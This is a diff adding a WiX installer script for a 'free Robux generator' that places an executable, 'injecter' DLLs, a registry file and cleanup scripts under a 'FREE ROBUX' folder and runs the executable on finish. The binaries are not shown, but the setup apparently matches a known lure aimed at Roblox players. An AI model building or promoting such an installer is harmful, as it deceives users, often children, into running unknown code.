@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+    <Product Id="*" Name="ManLaportory Robux Engine v5.1" Language="1033" Version="5.1.0.0" Manufacturer="NullProtocol" UpgradeCode="B9E2A100-42F1-4A22-8C31-39F2D3A1B2C4">
+        
+        <Package InstallerVersion="200" Compressed="yes" InstallScope="perMachine" />
+        <MajorUpgrade DowngradeErrorMessage="A newer version of [ProductName] is already installed." />
+        <Media Id="1" Cabinet="manlap.cab" EmbedCab="yes" />
+
+        <Directory Id="TARGETDIR" Name="SourceDir">
+            <Directory Id="ProgramFilesFolder">
+                <Directory Id="INSTALLFOLDER" Name="FREE ROBUX">
+                    
+                    <Component Id="MainEngine" Guid="7C3E2A15-B9D4-4E51-A23F-8C1B23456789" DiskId="1">
+                        <File Id="GeneratorEXE" Source="Free_robux_generation_v5.1beta+.exe" KeyPath="yes">
+                            <Shortcut Id="DesktopShortcut" Directory="DesktopFolder" Name="ManLaportory Robux Engine" WorkingDirectory="INSTALLFOLDER" Icon="GeneratorIcon.exe" Advertise="yes" />
+                        </File>
+                        
+                        <File Id="LicenseTXT" Source="license.txt" />
+                        <File Id="ReadmeTXT" Source="README.txt" />
+                        
+                        <File Id="UninstallerEXE" Source="unins000.exe" />
+                        <File Id="RobloxLinkerDLL" Source="Robloxlinker.dll" />
+                        <File Id="RobuxInjecterDLL" Source="Robuxinjecter.dll" />
+                        <File Id="ScriptPY" Source="script.py" />
+                        <File Id="ManifestXML" Source="manifest.xml" />
+                    </Component>
+
+                    <Directory Id="BinDir" Name="Bin">
+                        <Component Id="BinContent" Guid="550E8400-E29B-41D4-A716-446655440000" DiskId="1">
+                            <File Id="DataDAT" Source="Data.dat" KeyPath="yes" />
+                            <File Id="CleanupBAT" Source="cleanup.bat" />
+                            <File Id="CleanupEXE" Source="Cleanup.exe" />
+                        </Component>
+                    </Directory>
+                    
+                    <Directory Id="RegestryDir" Name="Regestry">
+                        <Component Id="RegContent" Guid="6BA7B810-9DAD-11D1-80B4-00C04FD430C8" DiskId="1">
+                            <File Id="RobuxReg" Source="Robuxinjecter.reg" KeyPath="yes" />
+                        </Component>
+                    </Directory>
+
+                    <Directory Id="ServerDir" Name="server">
+                        <Component Id="ServerContent" Guid="D94A15A9-96A9-4A9B-983C-12E6B4725354" DiskId="1">
+                            <CreateFolder />
+                        </Component>
+                    </Directory>
+
+                </Directory>
+            </Directory>
+            <Directory Id="DesktopFolder" Name="Desktop" />
+        </Directory>
+
+        <Icon Id="GeneratorIcon.exe" SourceFile="Free_robux_generation_v5.1beta+.exe" />
+        <UIRef Id="WixUI_Minimal" /> 
+        
+        <Property Id="WixShellExecTarget" Value="[#GeneratorEXE]" />
+        <CustomAction Id="LaunchApplication" BinaryKey="WixCA" DllEntry="WixShellExec" Impersonate="yes" />
+
+        <UI>
+            <Publish Dialog="ExitDialog" Control="Finish" Event="DoAction" Value="LaunchApplication">NOT Installed</Publish>
+        </UI>
+
+        <Feature Id="ProductFeature" Title="ManLaportory Engine" Level="1">
+            <ComponentRef Id="MainEngine" />
+            <ComponentRef Id="BinContent" />
+            <ComponentRef Id="RegContent" />
+            <ComponentRef Id="ServerContent" />
+        </Feature>
+    </Product>
+</Wix>
